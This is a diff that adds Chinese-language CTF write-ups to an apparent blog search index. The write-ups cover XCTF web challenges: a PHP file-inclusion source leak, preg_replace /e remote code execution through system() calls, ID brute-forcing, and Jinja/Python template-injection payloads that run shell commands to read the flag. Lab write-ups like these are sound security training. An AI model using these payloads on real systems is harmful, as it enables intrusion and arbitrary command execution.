@@ -19417,4 +19417,64 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 <p>而 tomcat 的 session id 值生成的策略，是一个随机数+时间+ jvm 的id值（jvm的id值会根据服务器的硬件信息计算得来），如果出现冲突就会再生成一个。</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>XCTF：Web-ics</title>
+    <url>/2021/10/21/xctf-web-ics/</url>
+    <content><![CDATA[<h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>dirsearch扫描出index.php/login</p>
+<p>进入有个?page</p>
+<pre><code>php://filter/read=convert.base64-encode/resource=index.php</code></pre>
+<p>index.php:****</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;br >Welcome My Admin ! &lt;br >"</span><span class="token punctuation">;</span>
+
+<span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>pat<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$replacement</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>rep<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$subject</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>sub<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$replacement</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$subject</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$replacement</span><span class="token punctuation">,</span> <span class="token variable">$subject</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p><strong>preg_replace($pattern, $replacement, $subject)</strong></p>
+<ul>
+<li>作用：搜索subject中匹配pattern的部分， 以replacement的内容进行替换。</li>
+<li>$pattern:       要搜索的模式，可以是字符串或一个字符串数组。</li>
+<li>$replacement:   用于替换的字符串或字符串数组。</li>
+<li>$subject:       要搜索替换的目标字符串或字符串数组。</li>
+</ul>
+<p>subject中有要搜索的pattern的内容，同时将在replacement前加上/e，触发/e漏洞，就可以执行replacement中的正确的php代码</p>
+<pre><code>?pat=/1/e&amp;rep=system('cd%20s3chahahaDir/flag%26%26%20ls')&amp;sub=1</code></pre>
+<p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211021185006756.png" alt="image-20211021185006756"></p>
+<pre><code>?pat=/1/e&amp;rep=system("cat%20s3chahahaDir/flag/flag.php")&amp;sub=1</code></pre>
+<p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211021184911923.png" alt="image-20211021184911923"></p>
+<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>扫描后台</p>
+<p>id爆破</p>
+<p>字典生成：</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> m <span class="token keyword">in</span>  range <span class="token punctuation">(</span><span class="token number">100001</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre>
+]]></content>
+  </entry>
+  <entry>
+    <title>XCTF：Web_python_template_injection</title>
+    <url>/2021/10/21/xctf-web-python-template-injection/</url>
+    <content><![CDATA[<pre><code>instance.__class__ 可以获取当前实例的类对象
+class.__mro__ 获取当前类对象的所有继承类
+__subclasses__()这个方法返回了类的所有存活的子类的引用
+os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置</code></pre>
+<h5 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h5><p>查看所有模块：</p>
+<pre><code>{{''.__class__.__mro__[2].__subclasses__()}}</code></pre>
+<p><img src="/XCTF%EF%BC%9AWeb-python-template-injection.assets/image-20211021124232805.png" alt="image-20211021124232805"></p>
+<pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}</code></pre>
+<p><img src="/XCTF%EF%BC%9AWeb-python-template-injection.assets/image-20211021124435199.png" alt="image-20211021124435199"></p>
+<pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}</code></pre>
+<h5 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h5><pre><code>{{[].__class__.__base__.__subclasses__()}}</code></pre>
+<pre><code>{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}}</code></pre>
+<pre><code>{{().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("cat fl4g").read()')}}</code></pre>
+]]></content>
+      <tags>
+        <tag>ssti</tag>
+      </tags>
+  </entry>
 </search>
